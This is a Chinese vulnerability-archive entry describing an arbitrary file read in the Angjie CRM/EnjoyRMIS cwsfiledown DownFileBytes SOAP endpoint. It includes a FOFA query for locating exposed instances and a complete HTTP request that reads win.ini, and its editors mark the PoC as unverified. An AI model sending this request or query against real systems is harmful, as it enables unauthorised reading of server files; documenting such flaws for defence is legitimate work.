---
source: "wy876 漏洞文库"
title: "昂捷CRM/EnjoyRMIS组件 cwsfiledown DownFileBytes读取"
product: "昂捷CRM/EnjoyRMIS组件"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "Windows，iPosition/iReadBytesLen分块读取，版本未知"
prerequisites: "无Cookie请求，权限不明"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ucrqld04f4zvnq32"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E6%98%82%E6%8D%B7CRM/%E6%98%82%E6%8D%B7CRMcwsfiledown%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"/ClientBin/slEnjoy.App.xap\""
id: "vw-c74c9d80eda64e563ac8ac8e"
entity_id: "ve-c74c9d80eda64e563ac8ac8e"
schema_version: "1"
previous_fofa_unverified: "body="
---

# 昂捷CRM/EnjoyRMIS组件 cwsfiledown DownFileBytes读取

> 指纹字段校订（2026-10-04）：本文原归档明确标为 FOFA 的完整表达式已记入 `fofa`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

## 条目说明

- 对象与具体问题：昂捷CRM/EnjoyRMIS组件；cwsfiledown DownFileBytes读取
- 版本、配置及部署条件：Windows，iPosition/iReadBytesLen分块读取，版本未知
- 认证与权限前提：无Cookie请求，权限不明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- CRM与EnjoyRMIS同路由组件归属需映射，不默认两独立产品或全产品受影响
- Content-Length length非法；bReadBytes为Base64填充占位，返回二进制需解码/长度说明
- iPosition1/读取100仅片段，未给返回不证明任意文件读取；版本元数据产品名
- 补修复/权限和进程可读范围

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
昂捷CRM (Customer Relationship Management) 是深圳市昂捷信息技术股份有限公司提供的一款专注于零售行业客户关系管理的系统。旨在帮助零售企业更好地管理客户、提升客户满意度和忠诚度，从而推动业务增长，该系统集成了客户信息管理、会员营销、客户服务等多个功能模块，为零售企业提供全方位的客户关系管理解决方案。昂捷CRM cwsfiledown存在任意文件读取漏洞

## 二、影响版本
```plain
昂捷CRM 
```

## 三、资产测绘
+ fofa`body="/ClientBin/slEnjoy.App.xap"`
+ 特征


## 四、漏洞复现
```http
POST /EnjoyRMIS_WS/WS/FileDown/cwsfiledown.asmx HTTP/1.1
Host: 
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/DownFileBytes"
 
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <DownFileBytes xmlns="http://tempuri.org/">
      <sFileName>c://windows//win.ini</sFileName>
      <iPosition>1</iPosition>
      <iReadBytesLen>100</iReadBytesLen>
      <bReadBytes>ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg</bReadBytes>
    </DownFileBytes>
  </soap:Body>
</soap:Envelope>
```

> 请求长度说明：原资料 Content-Length 为 length；保留原始标头；其数值未据实际请求体重新计算或验证。


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ucrqld04f4zvnq32>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
